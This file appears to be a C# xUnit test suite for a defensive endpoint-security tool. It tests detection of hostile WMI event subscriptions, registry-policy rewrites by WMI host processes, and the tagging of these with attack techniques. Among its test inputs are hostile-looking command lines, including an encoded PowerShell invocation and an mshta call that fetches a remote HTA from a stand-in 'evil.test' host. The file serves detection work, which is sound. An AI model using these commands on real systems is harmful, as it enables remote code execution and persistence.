using System;
using System.Collections.Generic;
using Xunit;
using Sentinel.Core;

namespace Sentinel.Tests
{
    /// <summary>
    /// v2.2.8 - WMI subscription triple, hostile consumer classification,
    /// policy-rewrite terminal family, wmiadap host identity.
    /// </summary>
    public class V228WmiHardeningTests
    {
        [Fact]
        public void ProductInfo_Version_Is228()
        {
            // v2.6.0: version is computed from version.txt / stamped assembly version.
            var asmVersion = typeof(ProductInfo).Assembly.GetName().Version?.ToString(3);
            Assert.Equal(asmVersion, ProductInfo.Version);
        }

        [Fact]
        public void UnifiedEtwSession_IncludesWmiActivityProvider()
        {
            Assert.Equal(
                new Guid("1418EF04-B0B4-4623-BF7B-2DE461B4F4CB"),
                UnifiedEtwSession.Providers.WmiActivity);
        }

        [Theory]
        [InlineData("powershell.exe -enc SQBFAFgA", true)]
        [InlineData(@"cmd.exe /c C:\Users\Public\p.bat", true)]
        [InlineData("mshta http://evil.test/x.hta", true)]
        [InlineData("SELECT * FROM Win32_ProcessStartTrace", false)]
        [InlineData("NTEventLogEventConsumer Application", false)]
        [InlineData("", false)]
        public void LooksHostile_ClassifiesExecutableConsumers(string text, bool expected)
        {
            Assert.Equal(expected, WmiPersistenceSignals.LooksHostile(text));
        }

        [Theory]
        [InlineData("WmiPrvSE", true)]
        [InlineData("WmiPrvSE.exe", true)]
        [InlineData("wmiadap", true)]
        [InlineData("scrcons.exe", true)]
        [InlineData("chrome", false)]
        [InlineData("Sentinel.Service", false)]
        public void IsWmiHostProcess_RecognizesProviderHosts(string name, bool expected)
        {
            Assert.Equal(expected, WmiPersistenceSignals.IsWmiHostProcess(name));
        }

        [Fact]
        public void SnapshotKey_IncludesQueryNotJustName()
        {
            var a = WmiPersistenceSignals.SnapshotKey(
                "filter", @"root\subscription", "Updater",
                "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'");
            var b = WmiPersistenceSignals.SnapshotKey(
                "filter", @"root\subscription", "Updater",
                "SELECT * FROM Win32_ProcessStartTrace");
            Assert.NotEqual(a, b);
            Assert.Contains("filter|", a);
            Assert.Contains(@"root\subscription", a);
        }

        [Fact]
        public void HostileWmiSubscription_IsKillGradeTerminal()
        {
            var d = new DetectionEvent
            {
                RuleName = "WMI Persistence: Hostile Event Subscription",
                Evidence = "Hostile WMI persistence object: 'cmdConsumer|root\\subscription|evil|powershell.exe -enc AA=='",
                Confidence = 0.92,
                Tier = DetectionTier.Tier1Behavioral,
                AuthorizedResponse = ResponseAction.LogOnly,
                ProcessName = "WmiPrvSE.exe",
                ProcessId = 4242,
            };
            ResponsePolicy.ApplyTierLaw(d);
            Assert.Equal(DetectionTier.Tier1Behavioral, d.Tier);
            Assert.Equal("WmiPersistence", ResponsePolicy.ClassifyTerminalOutcome(d));
            Assert.True(ResponsePolicy.IsKillGradeTerminal(d));
        }

        [Fact]
        public void NameOnlyWmiSubscription_IsNotKillGrade()
        {
            var d = new DetectionEvent
            {
                RuleName = "Persistence: New WMI Event Subscription",
                Evidence = "New WMI event subscription detected: 'consumer|root\\subscription|SCM Event Log Consumer|NTEventLogEventConsumer'",
                Confidence = 0.75,
                Tier = DetectionTier.Tier1Behavioral,
                AuthorizedResponse = ResponseAction.LogOnly,
                ProcessName = "SYSTEM",
                ProcessId = 0,
            };
            ResponsePolicy.ApplyTierLaw(d);
            Assert.Equal(DetectionTier.Tier2Indicator, d.Tier);
            Assert.Equal(ResponseAction.LogOnly, d.AuthorizedResponse);
            Assert.Null(ResponsePolicy.ClassifyTerminalOutcome(d));
        }

        [Fact]
        public void WmiPolicyRewrite_IsTerminalAndComposite()
        {
            var rewrite = new DetectionEvent
            {
                RuleName = "WMI Policy Rewrite: Provider Host Wrote Policies",
                Evidence = "SOFTWARE\\Policies hive changed. WriterHint='WmiPrvSE' PID=111",
                Confidence = 0.88,
                ProcessId = 111,
                ProcessName = "WmiPrvSE",
            };
            Assert.Equal("WmiPersistence", ResponsePolicy.ClassifyTerminalOutcome(rewrite));

            var composite = new DetectionEvent
            {
                RuleName = "WMI Persistence + Policy Rewrite",
                Evidence = "filter/consumer + Policies write",
                Confidence = 0.94,
                ProcessId = 111,
                ProcessName = "WmiPrvSE",
            };
            Assert.True(ResponsePolicy.IsNukeComposite(composite));
            ResponsePolicy.ApplyTierLaw(composite);
            Assert.Equal(DetectionTier.Tier1Behavioral, composite.Tier);
        }

        [Fact]
        public void Correlation_WmiSubscriptionPlusPolicy_EmitsComposite()
        {
            DetectionEvent? emitted = null;
            var engine = new BehavioralCorrelationEngine();
            engine.Initialize(e => { emitted = e; return System.Threading.Tasks.Task.CompletedTask; });

            engine.RegisterSignalAsync(new DetectionEvent
            {
                RuleName = "WMI Persistence: Hostile Event Subscription",
                ProcessId = 9001,
                ProcessName = "WmiPrvSE",
                Confidence = 0.92,
                Tier = DetectionTier.Tier1Behavioral,
                SignalType = SignalType.SecurityEvasion,
            }).GetAwaiter().GetResult();

            engine.RegisterSignalAsync(new DetectionEvent
            {
                RuleName = "WMI Policy Rewrite: Provider Host Wrote Policies",
                ProcessId = 9001,
                ProcessName = "WmiPrvSE",
                Confidence = 0.88,
                Tier = DetectionTier.Tier1Behavioral,
                SignalType = SignalType.SecurityEvasion,
            }).GetAwaiter().GetResult();

            Assert.NotNull(emitted);
            Assert.Equal("WMI Persistence + Policy Rewrite", emitted!.RuleName);
        }

        [Fact]
        public void AttackTechniqueMap_TagsWmiPolicyRewrite()
        {
            var d = new DetectionEvent
            {
                RuleName = "WMI Policy Rewrite: Provider Host Wrote Policies",
                Evidence = "Policies hive",
            };
            var ids = AttackTechniqueMap.Resolve(d.RuleName);
            Assert.Contains("T1112", ids);
            Assert.Contains("T1546.003", ids);
        }

        [Fact]
        public void SnapshotSubscriptions_DoesNotThrow()
        {
            var set = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            WmiPersistenceMonitor.SnapshotSubscriptions(set);
            // Live WMI may be empty on stripped images; the call must not throw.
            Assert.NotNull(set);
        }

        [Fact]
        public void PolicyFingerprint_IsStableAcrossCalls()
        {
            var a = WmiPolicyRewriteMonitor.FingerprintPolicyHives();
            var b = WmiPolicyRewriteMonitor.FingerprintPolicyHives();
            Assert.Equal(a, b);
        }

        [Fact]
        public void WmiHostRegistryHint_RecordsOnlyWmiHosts()
        {
            WmiHostRegistryHint.Reset();
            WmiHostRegistryHint.Record(50, "chrome");
            Assert.False(WmiHostRegistryHint.TryGetRecent(TimeSpan.FromSeconds(5), out _, out _));

            WmiHostRegistryHint.Record(4242, "WmiPrvSE.exe");
            Assert.True(WmiHostRegistryHint.TryGetRecent(TimeSpan.FromSeconds(5), out var pid, out var name));
            Assert.Equal(4242, pid);
            Assert.Equal("WmiPrvSE.exe", name);
        }
    }
}
